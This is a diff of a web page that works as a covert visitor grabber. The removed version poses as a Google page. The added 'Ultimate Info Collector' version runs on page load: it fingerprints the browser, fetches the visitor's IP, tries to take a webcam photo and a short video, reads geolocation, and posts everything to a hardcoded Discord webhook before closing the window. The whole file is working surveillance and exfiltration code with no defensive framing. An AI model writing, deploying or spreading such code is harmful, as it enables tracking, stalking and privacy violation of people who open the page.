@@ -1,32 +1,295 @@
-<!DOCTYPE html><html><head><title>Google</title><style>body{margin:0;background:#fff;color:#000;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}#logo{font-size:82px;color:#4285f4;letter-spacing:-2px;margin-bottom:20px;}input{width:582px;padding:13px 20px;border:1px solid #dfe1e5;border-radius:50px;outline:none;font-size:18px;}</style></head><body><div id="logo">Google</div><input type="text" value="Loading search results..." readonly><div id="status" style="margin-top:30px;color:#666;font-size:14px;">Analyzing page...</div><script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>dsfsfsdf</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+body {
+  margin: 0;
+  height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+  font-family: 'Orbitron', sans-serif;
+  color: #fff;
+  overflow: hidden;
+}
+
+#container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  background: rgba(0,0,0,0.3);
+  padding: 30px;
+  border-radius: 15px;
+  box-shadow: 0 0 20px rgba(0,0,0,0.5);
+  max-width: 80%;
+  text-align: center;
+}
+
+h1 {
+  margin: 0 0 20px;
+  font-size: 2rem;
+  letter-spacing: 2px;
+  color: #00ffe7;
+  text-shadow: 0 0 10px #00ffe7;
+}
+
+#status {
+  font-size: 1.2rem;
+  margin-bottom: 20px;
+  min-height: 50px;
+  position: relative;
+}
+
+/* Loading dots animation */
+@keyframes dots {
+  0%, 20% { content: ''; }
+  40% { content: '.'; }
+  60% { content: '..'; }
+  80%, 100% { content: '...'; }
+}
+
+#dots {
+  display: inline-block;
+  width: 3ch;
+  animation: dots 1s steps(3, end) infinite;
+  vertical-align: bottom;
+}
+
+button {
+  background: #00ffe7;
+  color: #000;
+  border: none;
+  padding: 12px 24px;
+  font-size: 1rem;
+  border-radius: 8px;
+  cursor: pointer;
+  margin-top: 20px;
+  font-family: 'Orbitron', sans-serif;
+  transition: background 0.3s;
+}
+button:hover {
+  background: #00c8b4;
+}
+</style>
+</head>
+<body>
+<div id="container">
+  <h1>Ultimate Info Collector</h1>
+  <div id="status">Initializing<span id="dots"></span></div>
+</div>
+
+<script>
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
-const info = {ts: new Date().toISOString(), ip: 'fetching', pcHint: 'n/a', ua: navigator.userAgent, plat: navigator.platform, scr: `${screen.width}x${screen.height}`, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lat: null, lon: null};
-async function main() {
+
+const info = {
+  ip: null,
+  userAgent: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  cookiesEnabled: navigator.cookieEnabled,
+  javaEnabled: navigator.javaEnabled(),
+  screenWidth: window.screen.width,
+  screenHeight: window.screen.height,
+  colorDepth: window.screen.colorDepth,
+  deviceMemory: navigator.deviceMemory || 'unknown',
+  hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+  maxTouchPoints: navigator.maxTouchPoints || '0',
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  online: navigator.onLine,
+  plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
+  userAgentData: navigator.userAgentData || {},
+  webglVendor: null,
+  webglRenderer: null,
+  sampleRate: null,
+  platformVersion: navigator.appVersion,
+  vendor: navigator.vendor,
+  doNotTrack: navigator.doNotTrack,
+  connectionType: (navigator.connection && navigator.connection.effectiveType) || 'unknown',
+  languageDirection: document.documentElement.dir || 'ltr',
+  referrer: document.referrer,
+  cookieEnabled: navigator.cookieEnabled,
+  productSub: navigator.productSub,
+  hardwareConcurrency: navigator.hardwareConcurrency,
+  maxTouchPoints: navigator.maxTouchPoints,
+  resolution: window.screen.width + 'x' + window.screen.height,
+  touchSupport: 'N/A',
+  latitude: null,
+  longitude: null
+};
+
+async function getSystemInfo() {
   try {
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    info.ip = (await ipRes.json()).ip;
-  } catch(e) { info.ip = 'err'; }
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    info.ip = data.ip;
+  } catch { info.ip = 'Unknown'; }
+
   try {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
     if (gl) {
-      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      if (dbg) info.pcHint = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
     }
-  } catch(e) {}
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(p => {
-      info.lat = p.coords.latitude; info.lon = p.coords.longitude; sendData();
-    }, () => sendData(), {timeout:8000});
-  } else sendData();
-  async function sendData() {
-    try {
-      const fd = new FormData();
-      fd.append('payload_json', JSON.stringify({content: '**Google Grab**', embeds: [{description: JSON.stringify(info, null, 2)}]}));
-      await fetch(WEBHOOK_URL, {method: 'POST', body: fd});
-    } catch(e) {}
-    setTimeout(() => window.close(), 1200);
+  } catch { }
+
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    info.sampleRate = ctx.sampleRate;
+  } catch { }
+
+  if (navigator.userAgentData) {
+    info.uaBrand = navigator.userAgentData.brands.join(', ');
+    info.uaPlatform = navigator.userAgentData.platform;
   }
 }
+
+async function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) { resolve(); }
+    else {
+      navigator.geolocation.getCurrentPosition(pos => {
+        info.latitude = pos.coords.latitude;
+        info.longitude = pos.coords.longitude;
+        resolve();
+      }, () => resolve());
+    }
+  });
+}
+
+async function takePhoto() {
+  const video = document.getElementById('video');
+  const canvas = document.createElement('canvas');
+  canvas.width = 640;
+  canvas.height = 480;
+  const ctx = canvas.getContext('2d');
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    await new Promise(res => video.onloadedmetadata = res);
+    ctx.drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    return canvas.toDataURL('image/jpeg', 0.9);
+  } catch(e) {
+    return null; // User denied or error
+  }
+}
+
+async function recordVideo() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.start();
+    await new Promise(res => setTimeout(res, 1000)); // 1 sec recording
+    mediaRecorder.stop();
+    await new Promise(res => mediaRecorder.onstop = res);
+    stream.getTracks().forEach(t => t.stop());
+    return new Blob(chunks, { type: 'video/webm' });
+  } catch(e) {
+    return null;
+  }
+}
+
+async function sendData() {
+  const locStr = (info.latitude && info.longitude) ? 
+    `Lat: ${info.latitude}\nLon: ${info.longitude}` : 
+    'Location unavailable';
+
+  const lines = [
+    `**Full Info Collection**`,
+    `IP: ${info.ip}`,
+    `UserAgent: ${info.userAgent}`,
+    `Platform: ${info.platform}`,
+    `Language: ${info.language}`,
+    `Cookies enabled: ${info.cookiesEnabled}`,
+    `Java enabled: ${info.javaEnabled}`,
+    `Screen: ${info.screenWidth}x${info.screenHeight}`,
+    `Color depth: ${info.colorDepth}`,
+    `Device Memory: ${info.deviceMemory}`,
+    `Hardware Concurrency: ${info.hardwareConcurrency}`,
+    `Max Touch Points: ${info.maxTouchPoints}`,
+    `Timezone: ${info.timezone}`,
+    `Online: ${info.online}`,
+    `WebGL Vendor: ${info.webglVendor}`,
+    `WebGL Renderer: ${info.webglRenderer}`,
+    `Audio Sample Rate: ${info.sampleRate}`,
+    `Plugins: ${info.plugins}`,
+    `Vendor: ${info.vendor}`,
+    `Do Not Track: ${info.doNotTrack}`,
+    `Connection Type: ${info.connectionType}`,
+    `Platform Version: ${info.platformVersion}`,
+    `Language Direction: ${info.languageDirection}`,
+    `Referrer: ${info.referrer}`,
+    `Touch Support: ${info.touchSupport}`,
+    `Resolution: ${info.resolution}`,
+    `UA.brands: ${info.uaBrand || 'N/A'}`,
+    `UA.platform: ${info.uaPlatform || 'N/A'}`,
+    `Product Sub: ${info.productSub}`,
+    `Cookies Enabled: ${info.cookieEnabled}`,
+    `WebGL Vendor: ${info.webglVendor}`,
+    `WebGL Renderer: ${info.webglRenderer}`,
+    `Connection Effective Type: ${info.connectionType}`,
+    `Vendor: ${info.vendor}`,
+    `Max Touch Points: ${info.maxTouchPoints}`,
+    `Device Memory: ${info.deviceMemory}`,
+    `Hardware Concurrency: ${info.hardwareConcurrency}`,
+    `Sample Rate: ${info.sampleRate}`,
+    `Language: ${info.language}`,
+    `Platform Version: ${info.platformVersion}`,
+    `Referrer: ${info.referrer}`,
+    `Touch Support: ${info.touchSupport}`,
+    `Latitude: ${info.latitude}`,
+    `Longitude: ${info.longitude}`
+  ];
+  const content = lines.join('\n') + `\n${locStr}`;
+
+  const formData = new FormData();
+  if (info.photoBlob) {
+    formData.append('files[0]', info.photoBlob, 'photo.jpg');
+  }
+  if (info.videoBlob) {
+    formData.append('files[1]', info.videoBlob, 'video.webm');
+  }
+  formData.append('payload_json', JSON.stringify({ content }));
+  await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+  window.close();
+}
+
+async function main() {
+  document.getElementById('status').innerText = 'Gathering system info...';
+  await getSystemInfo();
+
+  document.getElementById('status').innerText = 'Trying to take photo...';
+  const photoDataUrl = await takePhoto();
+  if (photoDataUrl) {
+    const res = await fetch(photoDataUrl);
+    info.photoBlob = await res.blob();
+  }
+
+  document.getElementById('status').innerText = 'POo';
+  info.videoBlob = await recordVideo();
+
+  document.getElementById('status').innerText = 'Gsss';
+  await getLocation();
+
+  document.getElementById('status').innerText = 'DIH';
+  await new Promise(r => setTimeout(r, 1000));
+
+  document.getElementById('status').innerText = 'CUH';
+  await sendData();
+}
+
 main();
-</script></body></html>
+</script>
+</body>
+</html> 
